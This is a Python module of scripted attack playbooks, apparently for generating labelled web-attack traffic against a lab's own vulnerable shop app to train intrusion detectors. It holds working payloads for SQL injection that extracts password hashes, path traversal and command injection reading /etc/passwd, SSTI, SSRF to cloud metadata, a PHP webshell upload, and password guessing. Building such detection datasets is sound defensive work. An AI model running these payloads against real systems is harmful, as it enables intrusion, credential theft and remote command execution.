"""Hand-written attacks, planned as steps.

These are the attacks a person carries out, as opposed to the tool runs in
`tools.py`. They exist because tool output is recognisable: sqlmap has a
signature, nikto has a signature, and a dataset made only of tool traffic
teaches a detector to spot tools rather than to spot attacks.

Three things make these look human rather than generated:

**They include mistakes.** The first traversal attempt uses too few `../` and
404s; the operator counts again and gets it. The first UNION guesses the wrong
column count. Real attack traffic is mostly failure, and a log where every
payload lands first time is a log where the failed attempts -- the majority of
what a real analyst sees -- are simply absent.

**They include dead ends.** Endpoints that turn out to be hardened get probed
and abandoned. That traffic is labelled by what it was, not by whether it
worked.

**They are paced.** Each step carries how long the operator thought before
making it. The runner honours that, so the inter-arrival pattern of an attack
is nothing like the driver's and nothing like a tool's.

Every payload here targets the lab's own application, which publishes no host
port and is reachable only from the three lab networks. The weaknesses they
exercise are documented in `app/VULNERABILITIES.md`.

Stdlib only.
"""

from typing import NamedTuple


class AttackStep(NamedTuple):
    method: str
    path: str
    category: str
    #: Contiguous runs of one activity become one episode. A playbook moves
    #: through its activities and never returns to one it has left.
    activity: str
    #: Seconds the operator spent before making this request. Reading a
    #: response takes longer than pasting the next payload.
    think: float = 1.0
    body: str = None
    headers: tuple = ()
    #: What the operator was trying. Recorded in the ledger for the dataset's
    #: own documentation, never used to derive a label.
    note: str = ""


def _q(value):
    from urllib.parse import quote
    return quote(value, safe="")


# ---------------------------------------------------------------------------
# Reconnaissance
# ---------------------------------------------------------------------------

def recon():
    """Find out what this is before touching anything."""
    return [
        AttackStep("GET", "/", "reconnaissance", "recon", 2.0,
                   note="look at the site like a customer would"),
        AttackStep("GET", "/robots.txt", "reconnaissance", "recon", 3.5,
                   note="robots.txt names the interesting directories"),
        AttackStep("GET", "/sitemap.xml", "reconnaissance", "recon", 4.0,
                   note="how big is the URL space"),
        AttackStep("HEAD", "/", "reconnaissance", "recon", 2.5,
                   note="server banner and headers"),
        AttackStep("GET", "/.git/config", "reconnaissance", "recon", 3.0,
                   note="exposed repository"),
        AttackStep("GET", "/.env", "reconnaissance", "recon", 2.0,
                   note="exposed environment file"),
        AttackStep("GET", "/server-status", "reconnaissance", "recon", 2.5,
                   note="mod_status left enabled"),
    ]


def directory_enumeration():
    """Walk a small wordlist by hand. Everything here 404s."""
    paths = ("/admin/", "/administrator/", "/backup/", "/backup.zip",
             "/old/", "/test.php", "/phpinfo.php", "/wp-login.php",
             "/config.bak", "/db.sql", "/uploads/", "/cgi-bin/")
    return [AttackStep("GET", path, "enumeration", "enumerate", 0.8,
                       note="hand-walked wordlist")
            for path in paths]


# ---------------------------------------------------------------------------
# SQL injection -- the /search endpoint (weakness 1)
# ---------------------------------------------------------------------------

def sqli_probing():
    """Find the injection point, get the column count wrong, then right."""
    return [
        AttackStep("GET", "/search?q=oak", "browsing", "probe", 3.0,
                   note="baseline: what does a normal search look like"),
        AttackStep("GET", f"/search?q={_q(chr(39))}", "injection", "probe", 4.0,
                   note="single quote -- does it break"),
        AttackStep("GET", f"/search?q={_q(chr(39) + chr(39))}", "injection",
                   "probe", 3.0, note="two quotes -- does it recover"),
        AttackStep("GET", f"/search?q={_q('zzqq' + chr(39) + ' OR 1=1--')}",
                   "injection", "probe", 6.0, note="boolean true"),
        AttackStep("GET", f"/search?q={_q('zzqq' + chr(39) + ' OR 1=2--')}",
                   "injection", "probe", 4.0,
                   note="boolean false -- compare the two"),
        # Wrong column count first. This is what actually happens.
        AttackStep("GET", f"/search?q={_q(chr(39) + ' UNION SELECT 1,2,3--')}",
                   "injection", "probe", 5.0, note="three columns -- wrong"),
        AttackStep("GET",
                   f"/search?q={_q(chr(39) + ' UNION SELECT 1,2,3,4,5--')}",
                   "injection", "probe", 4.0, note="five columns -- wrong"),
        AttackStep("GET",
                   f"/search?q={_q(chr(39) + ' UNION SELECT 1,2,3,4,5,6,7,8--')}",
                   "injection", "probe", 5.0, note="eight columns -- that fits"),
    ]


def sqli_extraction():
    """Having found the shape, take the account table."""
    return [
        AttackStep("GET", "/search?q=" + _q(
            chr(39) + " UNION SELECT 1,2,3,name,5,6,7,8 FROM sqlite_master--"),
            "injection", "extract", 6.0, note="what tables are there"),
        AttackStep("GET", "/search?q=" + _q(
            chr(39) + " UNION SELECT 1,2,3,username,5,6,7,8 FROM users--"),
            "injection", "extract", 5.0, note="usernames"),
        AttackStep("GET", "/search?q=" + _q(
            chr(39) + " UNION SELECT 1,2,3,username,password_hash,6,7,8 "
            "FROM users--"),
            "exploitation", "extract", 7.0,
            note="usernames and password hashes -- this is the payoff"),
    ]


def sqli_time_based():
    """The blind path, for when nothing is reflected.

    SQLite has no SLEEP(); hexing a large blob is the substitution. Measured at
    ~1.0s against ~0.03s. Used sparingly -- it materialises a 400MB string.
    """
    return [
        AttackStep("GET", "/search?q=" + _q(
            chr(39) + " AND 1=(SELECT LENGTH(HEX(RANDOMBLOB(200000000))))--"),
            "injection", "blind", 8.0, note="does a heavy query delay it"),
        AttackStep("GET", "/search?q=" + _q(
            chr(39) + " AND 1=1--"), "injection", "blind", 4.0,
            note="control: same shape, no work"),
    ]


# ---------------------------------------------------------------------------
# Path traversal (weakness 3)
# ---------------------------------------------------------------------------

def path_traversal():
    """Count the levels wrong, then overshoot on purpose."""
    return [
        AttackStep("GET", "/download?file=returns-policy.txt",
                   "browsing", "traverse", 3.0,
                   note="baseline: what does a legitimate document look like"),
        AttackStep("GET", "/download?file=" + _q("../../etc/passwd"),
                   "path_traversal", "traverse", 4.0, note="two levels -- 404"),
        AttackStep("GET", "/download?file=" + _q("../../../../etc/passwd"),
                   "path_traversal", "traverse", 3.0,
                   note="four levels -- still 404"),
        AttackStep("GET",
                   "/download?file=" + _q("../../../../../../../../etc/passwd"),
                   "path_traversal", "traverse", 3.5,
                   note="overshoot -- past root is harmless"),
        AttackStep("GET", "/download?file=" + _q(
            "../../../../../../../../etc/hostname"),
            "path_traversal", "traverse", 2.5, note="what host is this"),
        AttackStep("GET", "/download?file=" + _q(
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"),
            "path_traversal", "traverse", 3.0,
            note="encoded, in case something normalises"),
    ]


# ---------------------------------------------------------------------------
# Access control (weakness 2, plus the hardened routes)
# ---------------------------------------------------------------------------

def idor_walk(start=1, count=10):
    """Sign in, then walk the order ids.

    The ids are globally sequential and interleaved across customers, so most
    of what this returns belongs to somebody else. In the log it is a run of
    consecutive 200s from one client -- and no single line of it looks wrong.
    """
    steps = [
        AttackStep("GET", "/login", "authentication", "signin", 3.0,
                   note="sign in with the account we have"),
        AttackStep("POST", "/login", "authentication", "signin", 2.0,
                   body="username=demo&password=demo123"),
        AttackStep("GET", "/account/orders", "browsing", "signin", 3.0,
                   note="our own orders, to learn the id format"),
    ]
    steps += [
        AttackStep("GET", f"/account/orders/{n}", "access_control", "walk",
                   0.9, note="walking the sequence")
        for n in range(start, start + count)
    ]
    return steps


def forced_browsing():
    """Try the admin area as an ordinary customer. Half of it refuses."""
    return [
        AttackStep("GET", "/admin/", "access_control", "forced", 3.0,
                   note="is there an admin area at all"),
        AttackStep("GET", "/admin/users", "access_control", "forced", 2.5,
                   note="403 -- role check enforced here"),
        AttackStep("GET", "/admin/orders", "access_control", "forced", 2.0,
                   note="403 as well"),
        AttackStep("GET", "/admin/ping?host=127.0.0.1", "access_control",
                   "forced", 3.0, note="this one answers -- no role check"),
        AttackStep("GET", "/admin/template?tpl=Hello", "access_control",
                   "forced", 2.5, note="so does this one"),
    ]


def verb_tampering():
    """Same URLs, different methods, in case the check is method-scoped."""
    return [
        AttackStep("POST", "/admin/users", "access_control", "verbs", 2.5,
                   note="does POST bypass the check"),
        AttackStep("HEAD", "/admin/users", "access_control", "verbs", 2.0,
                   note="does HEAD"),
        AttackStep("OPTIONS", "/admin/orders", "access_control", "verbs", 2.0,
                   note="what methods does it admit to"),
        AttackStep("DELETE", "/api/cart?id=1", "access_control", "verbs", 2.0,
                   note="unauthenticated delete"),
    ]


# ---------------------------------------------------------------------------
# Command injection and SSTI (weaknesses 6 and 7)
# ---------------------------------------------------------------------------

def command_injection():
    return [
        AttackStep("GET", "/admin/ping?host=127.0.0.1", "reconnaissance",
                   "cmdi", 3.0, note="baseline"),
        AttackStep("GET", "/admin/ping?host=" + _q("127.0.0.1;id"),
                   "injection", "cmdi", 5.0, note="semicolon"),
        AttackStep("GET", "/admin/ping?host=" + _q("127.0.0.1;whoami"),
                   "injection", "cmdi", 3.0, note="who are we"),
        AttackStep("GET", "/admin/ping?host=" + _q("127.0.0.1;uname -a"),
                   "injection", "cmdi", 3.0, note="what is this box"),
        AttackStep("GET", "/admin/ping?host=" + _q("127.0.0.1 | cat /etc/passwd"),
                   "exploitation", "cmdi", 4.0, note="read a file through it"),
    ]


def ssti():
    return [
        AttackStep("GET", "/admin/template?tpl=" + _q("{{name}}"),
                   "reconnaissance", "ssti", 3.0, note="baseline substitution"),
        AttackStep("GET", "/admin/template?tpl=" + _q("{{7*7}}"),
                   "injection", "ssti", 5.0,
                   note="does it evaluate or substitute"),
        AttackStep("GET", "/admin/template?tpl=" + _q("{{phpversion()}}"),
                   "injection", "ssti", 4.0, note="it evaluates"),
        AttackStep("GET", "/admin/template?tpl=" + _q("{{file_get_contents('/etc/passwd')}}"),
                   "exploitation", "ssti", 6.0, note="arbitrary PHP"),
    ]


# ---------------------------------------------------------------------------
# SSRF (weakness 4)
# ---------------------------------------------------------------------------

def ssrf():
    """Point the importer at things it should not reach.

    Nothing outside the lab is routable from the container, so the external
    and metadata attempts fail at the network layer. The attempt is the part
    that lands in the dataset, and recognising it is the skill.
    """
    return [
        AttackStep("GET", "/admin/import-image?url=" + _q(
            "http://203.0.113.2/assets/css/site.css"), "ssrf", "ssrf", 4.0,
            note="baseline: a URL it is supposed to fetch"),
        AttackStep("GET", "/admin/import-image?url=" + _q(
            "http://169.254.169.254/latest/meta-data/"), "ssrf", "ssrf", 5.0,
            note="AWS instance metadata"),
        AttackStep("GET", "/admin/import-image?url=" + _q(
            "http://metadata.google.internal/computeMetadata/v1/"),
            "ssrf", "ssrf", 3.5, note="GCP metadata"),
        AttackStep("GET", "/admin/import-image?url=" + _q(
            "http://127.0.0.1/admin/users"), "ssrf", "ssrf", 4.0,
            note="make the server fetch its own admin page"),
        AttackStep("GET", "/admin/import-image?url=" + _q("file:///etc/passwd"),
                   "ssrf", "ssrf", 4.0, note="scheme confusion"),
    ]


# ---------------------------------------------------------------------------
# Upload bypass ending in a webshell (weakness 5)
# ---------------------------------------------------------------------------

WEBSHELL_BODY = '<?php echo "OK:".shell_exec($_GET["c"]); ?>'


def upload_webshell():
    """The obvious attempt fails; the double extension gets through."""
    return [
        AttackStep("GET", "/login", "authentication", "signin", 2.5),
        AttackStep("POST", "/login", "authentication", "signin", 2.0,
                   body="username=demo&password=demo123"),
        AttackStep("GET", "/account/avatar", "browsing", "upload", 3.0,
                   note="find the upload form"),
        AttackStep("POST", "/account/avatar", "exploitation", "upload", 5.0,
                   body="@upload:shell.php", note="plain .php -- refused, 415"),
        AttackStep("POST", "/account/avatar", "exploitation", "upload", 6.0,
                   body="@upload:shell.php.jpg",
                   note="double extension -- accepted"),
        AttackStep("GET", "/uploads/shell.php.jpg?c=id", "exploitation",
                   "webshell", 4.0, note="is it executable"),
        AttackStep("GET", "/uploads/shell.php.jpg?c=" + _q("uname -a"),
                   "exploitation", "webshell", 3.0),
        AttackStep("GET", "/uploads/shell.php.jpg?c=" + _q("ls -la /var/www/html"),
                   "exploitation", "webshell", 4.0, note="look around"),
        AttackStep("GET", "/uploads/shell.php.jpg?c=" + _q("cat /etc/passwd"),
                   "exploitation", "webshell", 3.5),
    ]


# ---------------------------------------------------------------------------
# Credentials (against the hardened login)
# ---------------------------------------------------------------------------

def brute_force(attempts=12):
    """Guess one account's password. The lockout answers 429 partway through."""
    passwords = ("123456", "password", "admin", "letmein", "qwerty",
                 "demo", "demo1", "welcome", "monkey", "dragon",
                 "hunter2", "demo123")
    return [
        AttackStep("POST", "/login", "credential_attack", "brute", 0.7,
                   body=f"username=demo&password={p}",
                   note="password guess")
        for p in passwords[:attempts]
    ]


def credential_stuffing():
    """A list of pairs from somewhere else, tried once each."""
    pairs = (("admin", "admin"), ("root", "toor"), ("agatha", "agatha"),
             ("rmarsh", "rmarsh"), ("pcollis", "password1"),
             ("demo", "demo123"), ("agatha", "brassneck"))
    return [
        AttackStep("POST", "/login", "credential_attack", "stuff", 1.1,
                   body=f"username={u}&password={p}",
                   note="reused pair")
        for u, p in pairs
    ]


# ---------------------------------------------------------------------------
# Cross-site scripting -- present, and barely visible in an access log
# ---------------------------------------------------------------------------

def xss():
    """Reflected and stored.

    Kept deliberately, and documented as a labelling limitation: the reflected
    payload shows in %r and that is all, while retrieval of a stored payload is
    a request for an ordinary page and is indistinguishable from browsing.
    """
    return [
        AttackStep("GET", "/search?q=" + _q("<script>alert(1)</script>"),
                   "injection", "xss", 4.0, note="reflected, unencoded"),
        AttackStep("GET", "/search?q=" + _q('"><img src=x onerror=alert(1)>'),
                   "injection", "xss", 3.0, note="attribute break-out"),
        AttackStep("GET", "/contact", "browsing", "xss", 3.0,
                   note="a form that stores what it is given"),
        AttackStep("POST", "/contact", "injection", "xss", 4.0,
                   body="name=x&email=x%40shop.test&message="
                        + _q("<script>fetch('/admin/users')</script>"),
                   note="stored -- and invisible in the log on retrieval"),
    ]


def session_tampering():
    return [
        AttackStep("GET", "/account/", "access_control", "session", 3.0,
                   headers=(("Cookie", "PHPSESSID=aaaaaaaaaaaaaaaaaaaaaaaaaaaa"),),
                   note="a session id we chose"),
        AttackStep("GET", "/account/orders", "access_control", "session", 2.5,
                   headers=(("Cookie", "PHPSESSID=0"),),
                   note="degenerate id"),
        AttackStep("GET", "/admin/", "access_control", "session", 3.0,
                   headers=(("Cookie", "PHPSESSID=admin; role=admin"),),
                   note="a cookie the application never sets"),
    ]


#: Every playbook, by name. `tools.py` and `campaigns.py` reference these.
PLAYBOOKS = {
    "recon": recon,
    "directory_enumeration": directory_enumeration,
    "sqli_probing": sqli_probing,
    "sqli_extraction": sqli_extraction,
    "sqli_time_based": sqli_time_based,
    "path_traversal": path_traversal,
    "idor_walk": idor_walk,
    "forced_browsing": forced_browsing,
    "verb_tampering": verb_tampering,
    "command_injection": command_injection,
    "ssti": ssti,
    "ssrf": ssrf,
    "upload_webshell": upload_webshell,
    "brute_force": brute_force,
    "credential_stuffing": credential_stuffing,
    "xss": xss,
    "session_tampering": session_tampering,
}
